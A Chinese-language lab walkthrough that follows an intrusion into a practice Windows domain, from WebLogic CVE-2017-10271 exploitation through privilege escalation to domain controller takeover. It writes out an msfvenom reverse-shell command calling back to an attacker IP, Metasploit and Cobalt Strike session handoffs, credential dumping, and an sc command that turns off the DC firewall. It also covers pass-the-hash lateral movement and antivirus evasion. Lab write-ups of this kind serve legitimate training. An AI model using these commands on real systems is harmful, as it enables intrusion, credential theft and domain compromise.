# 环境搭建

web：

外网ip - 192.168.10.80

内网ip - 10.10.10.80

PC：

外网ip - 192.168.10.201

内网ip - 10.10.10.201

DC：

内网ip - 10.10.10.10

web、PC、DC都处于同一域环境内，需要手动开启weblogic服务

# 外网

## 端口探测 

首先nmap扫描一下端口发现了1433端口判断是sql server，另外一个特征端口就是7001端口，判断为weblogic端口

```

nmap -T4 -sC -sV 192.168.10.80
```

![](../Images/5a77e11d8501a9b9468be6a160bfff49.png)

  

## weblogic getshell 

这里访问一下weblogic所在的7001端口，注意这里直接访问7001端口会显示404，这里直接访问`192.168.10.80:7001/console`即可

![](../Images/a855bd547768e50aa9c668288dfe6c19.png)

  

首先尝试一下控制台弱口令`weblogic weblogic`无果

![](../Images/c2689ed9b5f1ad1b5566943bd4bd0873.png)

  

这里直接使用weblogic漏洞检测工具，也可以使用weblogic批量扫描脚本去扫描，扫描发现存在几个反序列化漏洞

![](../Images/b9f670ed32e73eaf8abe42462599bff0.png)

  

这里我是用`CVE-2017-10271`进行命令执行发现为administrator权限

![](../Images/7dd3616e658e703e34e123e2bf5068d0.png)

  

查看ip情况为双网卡，初步判断有域环境

![](../Images/c73da2a442355c0c99e6ece0ab56ec91.png)

  

`tasklist /svc`查看一下进程发现了360主动防御，那么后面的马就需要做免杀处理

![](../Images/a54655085024b8b4c3208206836c0354.png)

  

这里直接使用漏扫工具中自带的jsp马先上传进行尝试

使用蚁剑尝试连接失败，这里我觉得可能是有360的原因，而jsp的马在蚁剑默认是没有加密解密器的，所以应该是被360给拦了

![](../Images/cd9a3f719693fefe897458c91965817e.png)

初步做一下信息搜集，发现DNS为`de1ay.com`，应该这个就是域的名称

![](../Images/433f74bf02d7837150dde896a3971e31.png)

  

## 上线msf 

这里首先生成一个msf的马

```

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.30 lport=4444 -f exe > msf.exe
```

![](../Images/0b06746934a79c3637383e45e588de37.png)

  

使用冰蝎上传到靶机上

![](../Images/e322efe2b3fb97d4e65ba32500e4ddaf.png)

  

执行一下，这里因为有360的原因使用msf的原生马是不能够上线的，会被360拦截

![](../Images/18a1750afa2eb8831d588a03882ce12c.png)

  

这里我后面使用了一下混淆进行了初步免杀处理，然后上线到了msf

![](../Images/9e507396cb539f9ce07f7e94e0ee8932.png)

  

# 内网渗透

## socks代理扫描内网 

这里首先添加一个10.10.10.0/24段的路由，方便后续操作

```


route add 10.10.10.0 255.255.255.0 1print

```

![](../Images/f8636c77fac400d1949e23a23c4cae9b.png)

  

使用socks路由把msf带入内网，需要在proxychains.conf里面添加路由

```


use auxiliary/server/socks4a
```

![](../Images/4ae61ec6894554e632b6f2954f08aabe.png)

  

这时候就可以使用msf中的`udp_probe`模块对10.10.10.0/24段的主机进行信息搜集，这里发现10段还有另外两台主机，10.10.10.10和10.10.10.201

![](../Images/aad689302ab83d2c64cadd48a57331b8.png)

  

这里使用常规的nmap对这两个ip进行端口扫描发现什么都没有扫出来，那么这里应该是有防火墙的原因

![](../Images/7969bf5ccba433a20135d565cd770fec.png)

  

## ms17-010 

这里使用ms17-010模块首先对内网进行扫描一下能不能够通过漏洞直接进行横向移动，注意因为有360的原因这里线程不要调的太高

```

use auxiliary/scanner/smb/smb_ms17_010set
 rhost 10.10.10.0/24set

 threads 5
```

扫描完成后发现这里两台主机都可以利用永恒之蓝，就结束了(吗？)

![](../Images/df0e665fae5bbd991f5d3ec51bf0cf07.png)

  

这里直接利用exp打一波，发现都打失败了，应该是没有开匿名管道的原因

```

use exploit/windows/smb/ms17_010_eternalblueset

 rhosts 10.10.10.80
```

![](../Images/51f6ee5dfe22ebacc3be95370277b736.png)

  

## msf派生cs会话 

这里我在鼓捣半天之后使用`getuid`查看了一下当前的权限发现还只是一个user权限，也使用不了mimikatz，因为在cs上提权比较方便，这里就直接msf派生个对话给cs，在cs上进行提权操作

使用`payload-inject`把msf的对话派生给msf

```

use exploit/windows/local/payload_injectset
 PAYLOAD windows/meterpreter/reverse_httpset DisablePayloadHandler true
set LHOST 192.168.1.5
set LPORT 5555
set SESSION 2


```

![](../Images/1a644010ddb71f32ba378071d52b9cc0.png)

  

这里在cs创建一个监听host为`192.168.1.5`，port为5555接受msf的对话

![](../Images/8fc096b15ee025ce71a0ab06eab5466e.png)

  

查看下内网ip的信息，dns为10.10.10.10，那么10.10.10.10大概率为域控

![](../Images/cdd3ed22b2770de194f1f684abd3d350.png)

  

查看一下主机信息，证实了猜想

```

net computers
```

![](../Images/b8f0513d253cd31cf1894af3aad84738.png)

  

## 权限提升 

这里因为是一个user权限首先要进行提权操作，使用`systeminfo`查看补丁情况发现只打了3个补丁，那么可以提权的exp有很多

![](../Images/0ee80ee8635170dbb3b08c7db4379414.png)

  

这里使用`ms14-058`直接提权到system

![](../Images/7c8429c9cebd9dfc998c415ef2395d0a.png)

  

使用`logonpasswords`导出密码

![](../Images/f0697a1b81ad096a5dc85d9b17c7930a.png)

  

看到这里有一个SID为500的域管的帐号，那么直接可以用psexec进行hash传递横向移动

![](../Images/f507a193a8c205e7c35cd5d296da4a85.png)

  

## 横向移动 

这里首先扫描一下网段下的主机

![](../Images/c9e14577b1074270503f3279d0c4a64e.png)

  

和基本判断的一致，内网下有3台主机

![](../Images/d9e13e36894f68c77cfd93aeda7836ce.png)

  

这里使用80主机进行psexec操作

![](../Images/83291748afef30c91ae41e4b3ad5b0d9.png)

  

这里psexec执行了但是没有主机上线，这里想起来psexec是需要在防火墙关闭的情况下才能够进行pth的，所以这里尝试一下先ipc连接关闭防火墙后再进行psexec横向移动

![](../Images/647917cdd53e6a23c56e0b63a9ab4ddd.png)

  

使用ipc与10.10.10.10进行连接

```


shell net use \\10.10.10.10\ipc$ 1qaz@WSX /user:Administrator
```

![](../Images/d2ced669126c54b21e4213148b155a9f.png)

  

使用sc创建计划任务立即执行关闭域控防火墙

```
sc \\10.10.10.10 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"

    
```

这里关闭之后psexec还是没有成功，是因为这里DC只有内网ip，所以这里需要用到web进行中转操作才能够上线cs

![](../Images/ce01803b78d08dab8c37eda8cfb58914.png)

  

这里我用到cs的smb beacon进行流量中转，首先建立监听一个smb beacon

![](../Images/5275abaa49083ccd718fe96f7fba839a.png)

  

再使用smb beacon进行psexec

![](../Images/ef77feadae45ddcefff6e08cdad4a0e4.png)

  

即可上线DC

![](../Images/41fd77f03ebfc5aecabb831a7040ca78.png)

  

这里因为拿到了域管的帐号，这里也使用psexec的方式上线cs，这里当时可以使用批量pth进行上线

![](../Images/025fe647a16cea8ba8f58eff9cb7fca3.png)

  

上线成功

![](../Images/eb98c6b6fcd82b861a2b4c8ceacd7105.png)
